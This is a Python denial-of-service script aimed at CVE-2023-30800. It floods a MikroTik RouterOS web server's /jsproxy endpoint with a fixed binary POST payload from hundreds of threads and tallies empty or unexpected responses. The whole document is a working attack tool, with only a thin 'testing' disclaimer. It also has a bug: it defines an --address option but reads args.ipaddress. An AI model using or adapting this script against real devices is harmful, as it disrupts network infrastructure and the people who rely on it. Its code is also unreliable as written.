# CVE-2023-30800 Multithredded DoSer
# https://github.com/KhogenTheRabbit/cve-2023-30800-multithread-doser
# For Testing Perposes Only

import argparse
import threading
import requests
import time
import sys

def parse_args():
    parser = argparse.ArgumentParser(description='DoS a Mikrotik RouterOS Web server')
    parser.add_argument('--address', type=str, help='Target IP address')
    parser.add_argument('--threads', type=int, default=500, help='Number of concurrent threads (default: 500)')
    return parser.parse_args()

def update_counts(response_type):
    global empty_response_count, weird_response_count
    with counter_lock:
        if response_type == "empty":
            empty_response_count += 1
        elif response_type == "weird":
            weird_response_count += 1
        sys.stdout.write(f'\r+ Received Empty Response: {empty_response_count} | - Received Weird Response: {weird_response_count}')
        sys.stdout.flush()

def dos_test_thread(thread_id):
    while True:
        try:
            # Send POST request
            response = requests.post(
                TARGET_URL,
                headers={"Content-Type": "msg"},
                data=BINARY_DATA
            )
            if not response.content:
                update_counts("empty")
            else:
                update_counts("weird")
        except requests.RequestException as e:
            update_counts("weird")

if __name__ == "__main__":
    args = parse_args()
    TARGET_URL = f"{args.ipaddress}/jsproxy"
    NUM_THREADS = args.threads
    BINARY_DATA = b'\x00\x00\x00\x00\x00\x00\x00\x00\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e\x5e'
    empty_response_count = 0
    weird_response_count = 0

    counter_lock = threading.Lock()
    threads = []
    for i in range(NUM_THREADS):
        thread = threading.Thread(target=dos_test_thread, args=(i,))
        thread.daemon = True 
        threads.append(thread)
        thread.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nDoS interrupted. Exiting...")

    print("DoS completed.")
